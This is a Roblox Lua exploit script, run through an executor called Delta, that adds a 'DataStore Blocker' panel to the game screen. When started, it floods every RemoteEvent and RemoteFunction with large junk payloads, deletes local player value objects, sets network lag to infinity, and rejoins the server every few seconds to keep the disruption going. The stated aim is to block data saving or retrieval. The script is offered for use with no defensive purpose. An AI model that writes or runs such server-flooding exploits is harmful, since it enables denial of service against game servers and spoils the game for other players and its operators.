-- DataStore Save Blocker - Server Overload Method
-- Execute this script with Delta

local Players = game:GetService("Players")
local TeleportService = game:GetService("TeleportService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local CoreGui = game:GetService("CoreGui")

local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")
local placeId = game.PlaceId

-- Create ScreenGui
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "DataStoreBlockerGUI"
screenGui.ResetOnSpawn = false
screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

-- Try to parent to CoreGui, fallback to PlayerGui
local success = pcall(function()
    screenGui.Parent = CoreGui
end)
if not success then
    screenGui.Parent = playerGui
end

-- Create Main Frame
local mainFrame = Instance.new("Frame")
mainFrame.Name = "MainFrame"
mainFrame.Size = UDim2.new(0, 320, 0, 220)
mainFrame.Position = UDim2.new(0.5, -160, 0.5, -110)
mainFrame.BackgroundColor3 = Color3.fromRGB(35, 35, 45)
mainFrame.BorderSizePixel = 0
mainFrame.Active = true
mainFrame.Draggable = true
mainFrame.Parent = screenGui

-- Add corner radius
local corner = Instance.new("UICorner")
corner.CornerRadius = UDim.new(0, 10)
corner.Parent = mainFrame

-- Create Title
local title = Instance.new("TextLabel")
title.Name = "Title"
title.Size = UDim2.new(1, -20, 0, 40)
title.Position = UDim2.new(0, 10, 0, 10)
title.BackgroundTransparency = 1
title.Text = "DataStore Blocker v2"
title.TextColor3 = Color3.fromRGB(255, 255, 255)
title.TextSize = 18
title.Font = Enum.Font.GothamBold
title.TextXAlignment = Enum.TextXAlignment.Left
title.Parent = mainFrame

-- Create Status Label
local statusLabel = Instance.new("TextLabel")
statusLabel.Name = "StatusLabel"
statusLabel.Size = UDim2.new(1, -20, 0, 30)
statusLabel.Position = UDim2.new(0, 10, 0, 55)
statusLabel.BackgroundTransparency = 1
statusLabel.Text = "Status: Ready"
statusLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
statusLabel.TextSize = 14
statusLabel.Font = Enum.Font.Gotham
statusLabel.TextXAlignment = Enum.TextXAlignment.Left
statusLabel.Parent = mainFrame

-- Create Info Label
local infoLabel = Instance.new("TextLabel")
infoLabel.Name = "InfoLabel"
infoLabel.Size = UDim2.new(1, -20, 0, 40)
infoLabel.Position = UDim2.new(0, 10, 0, 85)
infoLabel.BackgroundTransparency = 1
infoLabel.Text = "Overloads server on rejoin to\nprevent data retrieval"
infoLabel.TextColor3 = Color3.fromRGB(150, 150, 150)
infoLabel.TextSize = 11
infoLabel.Font = Enum.Font.Gotham
infoLabel.TextXAlignment = Enum.TextXAlignment.Left
infoLabel.TextWrapped = true
infoLabel.Parent = mainFrame

-- Create Start Button
local startButton = Instance.new("TextButton")
startButton.Name = "StartButton"
startButton.Size = UDim2.new(0, 280, 0, 40)
startButton.Position = UDim2.new(0, 20, 0, 135)
startButton.BackgroundColor3 = Color3.fromRGB(220, 50, 50)
startButton.Text = "Start Auto-Rejoin Loop"
startButton.TextColor3 = Color3.fromRGB(255, 255, 255)
startButton.TextSize = 15
startButton.Font = Enum.Font.GothamBold
startButton.BorderSizePixel = 0
startButton.Parent = mainFrame

-- Button corner
local buttonCorner = Instance.new("UICorner")
buttonCorner.CornerRadius = UDim.new(0, 8)
buttonCorner.Parent = startButton

-- Create Stop Button
local stopButton = Instance.new("TextButton")
stopButton.Name = "StopButton"
stopButton.Size = UDim2.new(0, 280, 0, 30)
stopButton.Position = UDim2.new(0, 20, 0, 182)
stopButton.BackgroundColor3 = Color3.fromRGB(60, 60, 70)
stopButton.Text = "Stop & Leave Normally"
stopButton.TextColor3 = Color3.fromRGB(255, 255, 255)
stopButton.TextSize = 12
stopButton.Font = Enum.Font.Gotham
stopButton.BorderSizePixel = 0
stopButton.Visible = false
stopButton.Parent = mainFrame

-- Stop button corner
local stopButtonCorner = Instance.new("UICorner")
stopButtonCorner.CornerRadius = UDim.new(0, 6)
stopButtonCorner.Parent = stopButton

-- Variables
local isRunning = false
local overloadThread = nil

-- Function to aggressively overload server
local function overloadServer()
    print("‚ö° [Overload] Starting server overload...")
    
    while isRunning do
        -- Method 1: Spam all RemoteEvents
        pcall(function()
            for _, remote in pairs(ReplicatedStorage:GetDescendants()) do
                if remote:IsA("RemoteEvent") then
                    for i = 1, 50 do
                        remote:FireServer(string.rep("X", 1000))
                    end
                end
            end
        end)
        
        -- Method 2: Spam all RemoteFunctions
        pcall(function()
            for _, remote in pairs(ReplicatedStorage:GetDescendants()) do
                if remote:IsA("RemoteFunction") then
                    for i = 1, 20 do
                        spawn(function()
                            remote:InvokeServer(string.rep("Y", 1000))
                        end)
                    end
                end
            end
        end)
        
        -- Method 3: Corrupt local player data
        pcall(function()
            for _, obj in pairs(player:GetChildren()) do
                if obj:IsA("ValueBase") or obj:IsA("Folder") then
                    obj:Destroy()
                end
            end
        end)
        
        -- Method 4: Network lag injection
        pcall(function()
            settings():GetService("NetworkSettings").IncomingReplicationLag = math.huge
        end)
        
        wait(0.1) -- Rapid fire
    end
end

-- Function to check if we should auto-start (on rejoin)
local function checkAutoStart()
    -- Check if we have a marker file/value indicating we should auto-start
    if game:GetService("ReplicatedStorage"):FindFirstChild("_DSBlockerActive") then
        print("üîÑ [Auto-Start] Detected rejoin marker, starting overload...")
        wait(0.5) -- Small delay
        isRunning = true
        overloadThread = task.spawn(overloadServer)
        
        statusLabel.Text = "Status: Overloading... üî•"
        statusLabel.TextColor3 = Color3.fromRGB(255, 100, 50)
        
        -- Rejoin after 5 seconds of overload
        wait(5)
        if isRunning then
            print("üîÑ [Auto-Rejoin] Rejoining to continue disruption...")
            TeleportService:Teleport(placeId, player)
        end
    end
end

-- Function to start the loop
local function startLoop()
    if isRunning then return end
    
    isRunning = true
    statusLabel.Text = "Status: Overloading Server üî•"
    statusLabel.TextColor3 = Color3.fromRGB(255, 100, 50)
    startButton.Visible = false
    stopButton.Visible = true
    
    -- Create persistent marker
    local marker = Instance.new("BoolValue")
    marker.Name = "_DSBlockerActive"
    marker.Parent = ReplicatedStorage
    
    print("üöÄ [DataStore Blocker] Started!")
    print("‚ö° [Overload] Aggressively disrupting server...")
    
    -- Start overload
    overloadThread = task.spawn(overloadServer)
    
    -- Auto-rejoin after 5 seconds
    wait(5)
    if isRunning then
        statusLabel.Text = "Status: Rejoining... üîÑ"
        print("üîÑ [Auto-Rejoin] Rejoining game...")
        wait(1)
        TeleportService:Teleport(placeId, player)
    end
end

-- Function to stop the loop
local function stopLoop()
    if not isRunning then return end
    
    isRunning = false
    
    -- Remove marker
    if ReplicatedStorage:FindFirstChild("_DSBlockerActive") then
        ReplicatedStorage._DSBlockerActive:Destroy()
    end
    
    -- Stop overload thread
    if overloadThread then
        task.cancel(overloadThread)
    end
    
    statusLabel.Text = "Status: Stopped"
    statusLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
    startButton.Visible = true
    stopButton.Visible = false
    
    print("‚õî [DataStore Blocker] Stopped")
    print("‚ÑπÔ∏è  Leaving normally - data may save")
    
    wait(1)
    player:Kick("‚úÖ DataStore Blocker Stopped - Leaving Safely")
end

-- Button handlers
startButton.MouseButton1Click:Connect(startLoop)
stopButton.MouseButton1Click:Connect(stopLoop)

-- Auto-start check on load
task.spawn(checkAutoStart)

print("‚úÖ [DataStore Blocker v2] Loaded!")
print("üì± [Mode] Server Overload + Auto-Rejoin")
print("‚ÑπÔ∏è  Click 'Start' to begin the loop")
